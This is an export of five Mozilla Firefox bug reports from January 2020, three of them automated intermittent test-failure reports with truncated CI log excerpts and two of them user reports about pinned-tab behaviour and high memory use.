1612597,"Intermittent browser/components/newtab/test/browser/browser_asrouter_targeting.js | should restore pinned sites to its original state - Got [{""url"":""https://amazon.com"",""label"":""@amazon"",""searchTopSite"":true,""baseDomain"":""amazon.com""}], expected [{""url"":""",RESOLVED,P5,INCOMPLETE,"**Filed by:** rmaries [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287094461&repo=try **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/D4c9ws2iSeGmzjYs_Xi9cQ/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-31T15:51:11.665Z] 15:51:11 INFO - TEST-START | browser/components/newtab/test/browser/browser_asrouter_targeting.js [task 2020-01-31T15:51:12.303Z] 15:51:12 INFO - TEST-PASS | browser/components/newtab/test/browser/browser_asrouter_targeting.js | should select correct item by host and searchTopSite in pinnedSites - [task 2020-01-31T15:51:12.303Z] 15:51:12 INFO - Buffered messages finished [task 2020-01-31T15:51:12.303Z] 15:51:12 INFO - TEST-UNEXPECTED-FAIL | browser/components/newtab/test/browser/browser_asrouter_targeting.js | should restore pinned sites to its original state - Got [{""url"":""https://amazon.com"",""label"":""@amazon"",""searchTopSite"":true,""baseDomain"":""amazon.com""}], expected [{""url"":""https://amazon.com"",""label"":""@amazon"",""searchTopSite"":true}] [task 2020-01-31T15:51:12.303Z] 15:51:12 INFO - Stack trace: [task 2020-01-31T15:51:12.303Z] 15:51:12 INFO - chrome://mochikit/content/browser-t"
1612612,Intermittent browser/base/content/test/siteIdentity/browser_bug906190.js | Test timed out -,RESOLVED,P5,INCOMPLETE,"**Filed by:** nerli [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287113302&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/WDSFvVvBT_WvlpKGgjpvjA/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-31T17:58:30.911Z] 17:58:30 INFO - TEST-START | browser/base/content/test/siteIdentity/browser_bug906190.js [task 2020-01-31T18:00:00.920Z] 18:00:00 INFO - TEST-INFO | started process screentopng [task 2020-01-31T18:00:01.252Z] 18:00:01 INFO - TEST-INFO | screentopng: exit 0 [task 2020-01-31T18:00:01.252Z] 18:00:01 INFO - Buffered messages logged at 17:58:30 [task 2020-01-31T18:00:01.252Z] 18:00:01 INFO - Entering test bound test_initialize [task 2020-01-31T18:00:01.252Z] 18:00:01 INFO - Leaving test bound test_initialize [task 2020-01-31T18:00:01.252Z] 18:00:01 INFO - Entering test bound test_same_origin [task 2020-01-31T18:00:01.252Z] 18:00:01 INFO - Console message: [JavaScript Error: ""Blocked loading mixed active content “http://test1.example.com/browser/browser/base/content/test/siteIdentity/file_bug906190.js”"" {file: ""https://test1.example.com/browser/browser/base/content/test/siteI"
1612624,New Tab opened from Pinned Tab goes to start of tabs instead of end of tabs.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Pin a tab (such as gmail) Have many other normal tabs open (over 15-20) From your pinned tab click a link that opens a new tab. Actual results: New tab opens to the far left (first) tab Expected results: New Tab opened FROM pinned tab should be treated as a ""Ctrl+T"" like new tab. The current behavior is what you would expect from a normal tab opening a new one directly to its right, but in a pinned tab environment, the new tab should open as an actual new tab at the end of the list."
1612640,Very high memory usage,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Firefox keeps using extremely high amounts of memory. I currently have 3 windows and ~30 tabs open across them. Would love to be able to pinpoint what is causing this. Apologies if it's obvious or if I'm posting in the wrong place. Just following advice from the Firefox subreddit and hoping I can figure out what's going on here so I can avoid moving back to Chrome. Thank you
1612647,Intermittent TEST-UNEXPECTED-TIMEOUT | browser/components/sessionstore/test/browser_unrestored_crashedTabs.js | application timed out after 370 seconds with no output,RESOLVED,P5,INCOMPLETE,"**Filed by:** nerli [at] mozilla.com **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287124627&repo=mozilla-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/YYjM-Zw1TVyUBq8G__i-lw/runs/0/artifacts/public/logs/live_backing.log --- [task 2020-01-31T23:14:55.291Z] 23:14:55 INFO - TEST-START | browser/components/sessionstore/test/browser_unrestored_crashedTabs.js [task 2020-01-31T23:14:55.318Z] 23:14:55 INFO - GECKO(3332) | [Child 5104: Main Thread]: I/DocShellAndDOMWindowLeak ++DOCSHELL 00E78400 == 3 [pid = 5104] [id = {22f92b90-c13d-48b8-a6ed-25f44f8d9391}] [task 2020-01-31T23:14:55.318Z] 23:14:55 INFO - GECKO(3332) | [Child 5104: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 13 (00E88700) [pid = 5104] [serial = 207] [outer = 00000000] [task 2020-01-31T23:14:55.319Z] 23:14:55 INFO - GECKO(3332) | [Child 5104: Main Thread]: I/DocShellAndDOMWindowLeak ++DOMWINDOW == 14 (070CA400) [pid = 5104] [serial = 208] [outer = 00E88700] [task 2020-01-31T23:14:55.394Z] 23:14:55 INFO - GECKO(3332) | [Child 5104, Main Thread] WARNING: Trying to request nsIHttpChannel from DocumentChannel, this is likely broken: file z:/build/build/src"
